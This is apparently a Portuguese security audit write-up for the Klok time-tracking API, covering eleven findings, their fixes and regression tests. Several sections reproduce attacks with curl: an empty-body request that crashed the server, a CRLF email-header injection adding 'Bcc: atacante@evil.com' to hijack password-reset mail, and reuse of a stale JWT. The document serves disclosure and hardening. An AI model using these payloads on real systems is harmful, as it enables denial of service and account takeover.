# Segurança do Klok

Auditoria de segurança do backend (`klok-api/`) feita por testes dinâmicos, com a
API real em execução e requisições HTTP de verdade. Nenhum achado aqui é
resultado de leitura de código: todos foram reproduzidos.

Cada vulnerabilidade corrigida tem um teste de regressão em
`klok-api/test/ataques.test.js` que falha se o problema voltar. Isso foi
verificado revertendo cada correção e confirmando que o teste correspondente
quebra.

---

## Como reproduzir

```bash
cd klok-api
npx nvm use 24        # o projeto exige Node 22.5+ (node:sqlite)
npm test              # 74 testes, 29 deles de ataque
```

Pendências conhecidas, cada uma com issue: [#13](https://github.com/northoncardoso/Klok/issues/13)
revogação de JWT (corrigida), [#14](https://github.com/northoncardoso/Klok/issues/14)
rate limit compartilhado, [#15](https://github.com/northoncardoso/Klok/issues/15)
`nodemailer` 10.x e Helmet, [#16](https://github.com/northoncardoso/Klok/issues/16)
corrida na criação do mestre.

A auditoria inteira foi feita com a API real em execução e requisições HTTP de
verdade, por isso as descrições abaixo trazem o `curl` e a resposta observada, e
não só a leitura do código.

Os testes de segurança vivem em dois arquivos:

- `test/ataques.test.js`: 25 testes de simulação de ataque, que cobrem as correções.
- `test/seguranca.test.js`: 4 testes de garantias de base (hash com sal, variáveis de ambiente).

---

## Resumo

| # | Achado | Severidade | Status |
|---|--------|-----------|--------|
| 1 | DoS remoto não autenticado | crítico | corrigido, com teste |
| 2 | Vazamento de stack trace e caminho do servidor | alto | corrigido, com teste |
| 3 | Injeção de cabeçalho de email (CRLF) | alto | corrigido, com teste |
| 4 | Fallback de desenvolvimento virava oráculo de senha | alto | corrigido, com teste |
| 5 | Rate limit compartilhado permite travar o login legítimo | médio | em aberto |
| 6 | Token JWT de 12h não é invalidado ao trocar a senha | médio | corrigido, com teste |
| 7 | Token de redefinição viaja na URL | médio | parcialmente |
| 8 | API sem TLS e sem headers de segurança | médio | parcialmente |
| 9 | Política de senha ausente | médio | parcialmente |
| 10 | Cadastro de funcionário aberto, sem aprovação | médio | em aberto |
| 11 | Página de redefinição sem limite de requisições | baixo | em aberto |

---

## Corrigidos

### 1. DoS remoto não autenticado (crítico)

Uma única requisição derrubava a API inteira. Sem token, sem credencial, sem
conta cadastrada.

```bash
curl -X POST http://localhost:3000/api/auth/login -H 'content-type: application/json' -d '{}'
# processo do Node morria com código 1
```

A causa era uma cadeia de três falhas:

1. `usuario?.trim()` devolve `undefined` quando `usuario` não é string. O `?.`
   protege contra `null` e `undefined`, mas não contra tipos errados.
2. `undefined` chegava como parâmetro do SQLite em `buscarUsuarioPorLogin`, que
   lança `TypeError`.
3. O `TypeError` acontecia dentro de um handler `async`. O Express 4 não captura
   rejeição de promise, então virava unhandled rejection e o Node 24 aborta o
   processo.

O mesmo caminho era alcançável em `registrar`, `loginGoogle`, `esqueci-senha` e
`redefinir-senha`. Um `PUT /api/funcionarios/:id` com corpo vazio também quebrava,
por causa de `nome?.trim()` indo para o banco.

Correção em três camadas:

- `validacao.js`: `texto()` devolve `''` para qualquer valor que não seja string,
  então nada nunca mais chega `undefined` no banco.
- `db.js`: `paraTexto()` normaliza todo texto antes do bind, como segunda camada.
- `middlewares.js`: `asyncHandler` envolve todo handler, e um tratador de erros
  global devolve 500 genérico. Rejeição de promise não vira mais morte do processo.

Testes: `payload malformado nunca derruba a API nem vaza erro interno` roda 17
payloads malformados e verifica que nenhuma rejeição não tratada escapou, mais
`a API continua respondendo depois dos payloads malformados`.

### 2. Vazamento de stack trace (alto)

`PUT /api/funcionarios/:id` com `{}` devolvia HTTP 500 com HTML contendo o stack
trace completo, o caminho absoluto do servidor (`/home/.../db.js`), número da
linha e o código-fonte. Ajuda quem procura brechas.

Correção: tratador de erros global em `middlewares.js` que registra no servidor e
devolve só `{ "erro": "Erro interno no servidor" }`. Erros de cliente do
`express.json` (JSON malformado, corpo grande) continuam devolvendo 400 e 413.

### 3. Injeção de cabeçalho de email, CRLF (alto)

Cadeia completa, reproduzida de ponta a ponta:

```bash
# 1. atacante se cadastra normalmente
curl -X POST .../api/auth/registrar -d '{"usuario":"atacante","senha":"a","nome":"A"}'
# 2. grava email com CRLF no próprio perfil
curl -X PUT .../api/auth/eu -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"vitima@exemplo.com\r\nBcc: atacante@evil.com"}'
# 3. pede a recuperação usando esse email
curl -X POST .../api/auth/esqueci-senha -d '{"email":"vitima@exemplo.com\r\nBcc: atacante@evil.com"}'
```

Resultado observado: o email saía com o cabeçalho injetado,

```
"para": "vitima@exemplo.com\r\nbcc: atacante@evil.com"
```

isto é, a credencial SMTP da empresa servia para entregar mensagem a
destinatários escolhidos pelo atacante. Isso é CWE-93 e se combina com o CVE
alto do `nodemailer` 6.10.1 (ver dependências).

Correção: `emailValido()` em `validacao.js` rejeita qualquer caractere de
controle e exige formato de email. Aplicado no perfil, na recuperação de senha e
no cadastro do mestre. `email.js` ganhou uma segunda camada, `destinatarioValido()`,
que o próprio serviço de email aplica antes de enviar.

### 4. Fallback de desenvolvimento virava oráculo (alto)

Quando não há SMTP, a rota de recuperação devolvia o token na resposta:

```json
{
  "mensagem": "Se este email estiver cadastrado...",
  "linkRedefinicao": "klok://redefinir-senha?token=1f396ff7...",
  "linkPagina": "http://localhost:3000/redefinir-senha/1f396ff7..."
}
```

A resposta genérica só se protegia quando o SMTP estava configurado, e o
guard era `!process.env.SMTP_HOST`, ou seja, configuração em vez de ambiente. Um
deploy sem SMTP permitia pedido de redefinição para qualquer email cadastrado e
devolvia o token pronto, tomada de conta.

Correção: o gate passou a ser `NODE_ENV`, não a ausência de SMTP. Em produção o
link nunca volta, o `email.js` de fallback lança em vez de vazar, e o `server.js`
avisa no boot se faltar SMTP.

---

## Em aberto

### 5. Rate limit compartilhado (médio)

Um único `limitadorAuth` atende os cinco endpoints de autenticação e o contador
é por IP. Vinte e duas requisições de registro travam o login legítimo do mestre,
reproduzido com o limitador padrão:

```
POST /api/auth/registrar x24 -> 201 ate a 21a, 429 a partir da 22a
POST /api/auth/mestre       -> 201
POST /api/auth/login        -> 429  (o mestre nem consegue entrar)
```

Torna-se um ataque de lockout em rede compartilhada, e no emulador Android todos
os clientes são o mesmo IP. Além disso o limite vive em memória, então reiniciar
o processo zera tudo, e `GET /redefinir-senha/:token` não passa por ele.

Fica para uma rodada própria: separar o balde por endpoint e por usuário, e
definir a resposta para rate limit no app.

### 6. JWT sem revogação (médio, corrigido)

O token vivia 12 horas, sem `jti` e sem refresh token, então não havia como
revogá-lo. Reproduzido nos dois caminhos de troca de senha:

```bash
TOKEN=$(curl -s -X POST .../api/auth/login -d '{"usuario":"mestre1","senha":"antiga"}' | jq .token)
curl -X PUT .../api/auth/senha -H "Authorization: Bearer $TOKEN" \
  -d '{"senhaAtual":"antiga","senhaNova":"nova1234"}'
# 200, senha trocada
curl .../api/funcionarios -H "Authorization: Bearer $TOKEN"
# 200 -> o token antigo ainda gerencia funcionários
```

O mesmo acontece depois de redefinir pelo email: o token emitido antes do reset
continua valendo. O app desloga localmente, mas o token segue vivo no servidor, e
quem o copiou continua com acesso de mestre.

Resolvido na issue #13. A coluna `usuarios.senhaVersao` conta as trocas de senha, o
valor viaja no token como `v`, e o `autenticar` recusa token cujo `v` não bate
com a versão atual. Trocar ou redefinir a senha passa a derrubar as sessões
anteriores, inclusive o acesso de mestre.

Um contador de versão foi escolhido no lugar de carimbo de tempo depois que a
primeira implementação falhou num teste: com `senhaAlteradaEm` em segundos, o
token emitido no mesmo segundo da troca era indistinguível do antigo, e a regra
restritiva deslogava o usuário imediatamente. Contador não tem granularidade.

Correção extra no mesmo caminho: `marcarRecuperacaoUsada` recebia o **id do
usuário** em vez do **id do registro**, então usar um link de recuperação invalidava
todos os links pendentes daquele usuário de uma vez. Passou a ser por registro,
o que é o que "token de uso único" significa.

### 7. Token de redefinição na URL (médio, parcialmente resolvido)

`/redefinir-senha/:token` põe o token no caminho, e o caminho aparece em log de
acesso e histórico do navegador. A página HTML também ecoava o token dentro de um
`onclick` inline.

Resolvido agora: o token só é interpolado se casar com `/^[0-9a-f]{64}$/`, há
escape de HTML, e as duas páginas mandam `Referrer-Policy: no-referrer`.

Falta resolver a causa: o token não deveria viajar na URL. Alternativa é um
formulário POST com o token no corpo, ou um código curto de uso único.

### 8. TLS e headers (médio, parcialmente resolvido)

A API escuta em `0.0.0.0` por HTTP puro, então o JWT trafega em claro na rede,
e o README desenha HTTPS que não existe no código.

Resolvido agora: `X-Powered-By` removido, e a API envia `X-Content-Type-Options`,
`X-Frame-Options`, `Referrer-Policy` e `Cache-Control: no-store`. `helmet` não foi
adicionado para não puxar dependência nova neste momento.

Falta: terminar o TLS na frente da API e avaliar `helmet` com CSP.

### 9. Política de senha (médio, parcialmente resolvido)

`POST /api/auth/registrar` aceitava senha de um caractere, e o `SENHA_MESTRE`
antigo era `1234`, quatro dígitos que eu confirmei autenticando como mestre.

Resolvido agora: mínimo de 4 caracteres no registro, troca, redefinição e no
cadastro do mestre, e o `SENHA_MESTRE` deixou de existir, então a senha do mestre
passa a ser a que o usuário digita na primeira tela.

Falta: exigir tamanho maior e alguma complexidade, e travar tentativas de senha
fraca. Quatro caracteres é o piso, não uma política.

### 10. Cadastro aberto (médio)

`POST /api/auth/registrar` é público e sem aprovação: qualquer pessoa cria conta
e já bate ponto. Login com Google também cria usuário para qualquer conta, sem
checar `email_verified` nem domínio.

Não corrigido por ser decisão de produto, não defeito. Mas vale saber que
"criei uma conta e entrei no app" é o estado atual.

### 11. Página de redefinição sem limite (baixo)

Cinquenta GETs seguidos em tokens inválidos, todos 200, nenhum 429. Como o token
tem 256 bits, forçar é inviável, mas a rota não passa pelo limitador.

---

## Dependências

`npm audit` no backend em 2026-09-28, com Node 24.18.0: 1 alta e 5 moderadas.

| Pacote | Versão atual | Gravidade | Versão vulnerável | Correção |
|--------|--------------|-----------|-------------------|----------|
| `nodemailer` | 6.10.1 | **alta** | `<= 10.0.1` | 10.0.12 (major) |
| `body-parser` | via express | moderada | 1.20.5 a 1.20.6 | sem breaking |
| `express` | 4.22.2 | moderada | 4.22.2 | sem breaking |
| `qs` | via express | moderada | 2.2.5 a 6.15.3 | sem breaking |
| `gaxios` | via google-auth-library | moderada | 6.4.0 a 6.7.1 | sem breaking |
| `uuid` | via gaxios | moderada | `< 11.1.1` | sem breaking |

Sobre o `nodemailer`, o aviso alto tem 13 advisories no range `<= 10.0.1`, e três
merecem atenção neste projeto:

- **Injeção de cabeçalho por CRLF** em `List-*` e no nome do transport, que é o
  mesmo vetor do achado 3 e o que torna a validação de email obrigatória.
- **Validação TLS incorreta no fetch de token OAuth2**, que permite interceptar
  credencial. Relevante se algum dia o envio usar OAuth2 em vez de senha de app.
- **Cache de DNS por processo reutiliza o `servername` TLS entre transports**,
  o que pode vazar credencial SMTP para outro tenant.

Mitigação aplicada: `emailValido()` e `destinatarioValido()` fecham o vetor de
CRLF na aplicação, independentemente da versão instalada. A atualização para a
10.x continua indicada, e como é major, precisa de plano de teste: o caminho de
envio real (`enviarEmail`) deve ser exercitado com SMTP de verdade, não só com
mock.

---

## O que já estava certo

Isso foi verificado e continua coberto por teste, para não regredir:

- **Autorização no servidor.** 401 sem token e 403 para funcionário em toda rota
  de mestre. A interface esconde as telas, mas quem decide é o backend.
- **Sem IDOR.** Os pontos usam o `funcionarioId` do token, nunca um id do corpo da
  requisição. Não dá para ler ou bater ponto no lugar de outra pessoa.
- **JWT íntegro.** `jose` com `algorithms: ['HS256']` rejeita `alg=none`,
  assinatura adulterada, token de outro segredo e token expirado.
- **Senha com scrypt e sal**, comparação em `timingSafeEqual`, e migração
  automática do hash legado SHA-256 no primeiro login.
- **Token de recuperação** guardado só como SHA-256, uso único, expiração de
  30 minutos.
- **Resposta genérica** em "esqueci minha senha" quando o SMTP está configurado.
- **Segredos fora do git.** Só `.env.example` é versionado, e o histórico não tem
  senha commitada.
- **Token do app em `expo-secure-store`**, com `secureTextEntry`,
  `autoCapitalize="none"` e `autoCorrect={false}`.
- **Nenhum segredo do mestre em arquivo.** A senha é escolhida na primeira tela e
  nunca passa por `.env`.

---

## Regras que a suíte garante

Para manter o resultado, qualquer mudança precisa continuar passando:

- Nenhum `String(valor)` em campo vindo do cliente. Validação é com `validacao.js`.
- Todo handler de rota passa por `asyncHandler`.
- Nenhum `res.json` devolve `senhaHash` ou `tokenHash`.
- Mensagem de erro de autenticação não distingue "usuário não existe" de "senha
  errada".
